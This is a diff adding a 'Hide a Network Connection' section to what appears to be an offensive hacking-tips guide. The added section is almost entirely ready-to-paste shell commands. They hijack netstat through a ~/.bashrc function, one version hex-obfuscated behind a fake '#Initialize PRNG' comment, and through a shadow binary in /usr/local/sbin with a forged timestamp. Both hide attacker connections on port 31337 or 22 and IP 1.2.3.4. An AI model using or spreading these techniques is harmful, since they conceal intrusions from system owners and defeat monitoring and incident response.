@@ -11,6 +11,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Hide your command](#hyc-anchor)
    1. [Hide your arguments](#hya-anchor)
    1. [Hide a process](#hide-a-process)
+   1. [Hide a network connection](#hide-a-connection)
 1. [SSH](#ais-anchor)
    1. [Almost invisible SSH](#ais-anchor)
    1. [SSH tunnel OUT](#sto-anchor)
@@ -147,6 +148,42 @@ hide nohup sleep 1234 &>/dev/null &  # Starts and hides 'sleep 1234' as a backgr
 ```
 
 (thanks to *druichi* for improving this)
+
+<a id="hide-a-connection"></a>
+**1.v. Hide a Network Connection**
+
+The trick is to hijack `netstat` and use grep to filter out our connection. This example filters any connection on port 31337 _or_ ip 1.2.3.4. 
+
+**Method 1 - Hijacking with bash-function from ~/.bashrc**
+
+Cut & paste this to add the line to ~/.bashrc
+```shell
+echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc
+```
+
+Or cut & paste this do the same but obfuscated in ~/.bashrc:
+```shell
+X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
+echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps)#Initialize PRNG" >>~/.bashrc
+```
+
+The added entry to ~/.bashrc will look like this:
+```
+eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps)#Initialize PRNG
+```
+
+**Method 2 - Hijacking with a binary in PATH**
+
+Hide a hijacking binary in /usr/local/sbin whereas the real netstat is in /usr/bin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that the hijacking binary (netstat) will be executed instead of /usr/bin/netstat.
+
+```shell
+echo -e "#! /bin/bash
+exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/netstat \
+&& chmod 755 /usr/local/sbin/netstat \
+&& touch -r /usr/bin/netstat /usr/local/sbin/netstat
+```
+
+*(thank you iamaskid)*
 
 ---
 <a id="ais-anchor"></a>
